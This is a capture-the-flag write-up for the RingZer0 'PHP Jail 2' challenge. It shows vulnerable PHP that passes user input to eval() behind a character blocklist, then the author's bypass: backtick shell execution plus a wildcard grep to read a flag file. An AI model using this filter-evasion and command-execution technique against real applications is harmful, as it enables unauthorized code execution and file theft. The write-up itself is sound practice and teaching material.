# PHP Jail 2

LINK : https://ringzer0ctf.com/challenges/224

# My Approach
- Let's login
- Password is flag of first question PHP Jail 1
```sh
$ ssh level2@challenges.ringzer0team.com -p 10223
RingZer0 Team Online CTF

PHP Jail Level 2
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge PHP code:
-----------------------------

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(\/|a|c|s|require|include|flag|eval|file)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:
```
Interesting, it's first problem with a twist.

What's the twist ?
- we can use $
- we can use system/ exec/ etc
- But we cannot use a/c/s alphabets, which makes it interesting

Let's try somethings

```sh
system('ls');
Restricted characters has been used
```
Ahh, we cannot use **s**

- Let's check how to use system command in php
- System : http://php.net/manual/en/function.system.php
- See also in PHP docs shows : `Backticks`

Let's try to use ``, 
Example : 
```php
<?php
$output = `ls -al`;
echo "<pre>$output</pre>";
?>
```
- So we can execute commands just by ``
- Now we have to CAT this file, but we cannot use CAT command, grep maybe 
- Quick google search shows cat, grep, sed, awk, head, tail
- Seems we can use only `grep` as a/c/s is not allowed

Grep :
- Now we have to grep FLAG in flag.txt
- simple grep command `grep -E 'F' flag.txt`

Wild Cards :
- However we cannot use flag keyword. Instead we can use wildcard, which can be ????.???
- So our command will be modified to `grep -E 'F' ????.???`
- Since we cannot use `echo`, we can use `print`

```sh
print `grep -E 'F' ????.???`
YOUR FLAG HERE :D
```

